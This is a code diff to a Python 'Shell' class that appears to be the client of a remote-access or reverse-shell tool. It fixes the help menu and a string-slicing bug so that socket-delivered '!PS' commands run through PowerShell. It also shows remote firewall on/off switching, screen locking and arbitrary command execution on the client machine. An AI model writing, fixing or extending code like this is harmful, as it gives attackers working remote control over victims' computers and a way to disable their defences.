@@ -39,11 +39,11 @@ class Shell:
 
                 # opens help menu
                 if data == "!help":
-                    help_msg = "Custom commands are: \
-                        \n !PS [command]: Execute command with powershell \
-                        \n !firewall on/off: Turns on/off firewall \
-                        \n !lock: Locks screen of client \
-                        \n !help: Opens this menu\n"
+                    help_msg = "\nCustom commands are: \
+                    \n!PS [command]: Execute command with powershell \
+                    \n!firewall on/off: Turns on/off firewall \
+                    \n!lock: Locks screen of client \
+                    \n!help: Opens this menu\n"
 
                     self.sock.send(str.encode(help_msg))
 
@@ -71,8 +71,8 @@ class Shell:
                     data = "echo Screen locked"
 
                 # Executes command with powershell
-                if data[:2] == "!PS":
-                    data = "PowerShell.exe -command {}".format(data[3:])
+                if data[:3] == "!PS":
+                    data = "PowerShell.exe -command {}".format(data[4:])
 
                 if len(data) > 0 and not data == "!help":
                     # Executes arbitrary command
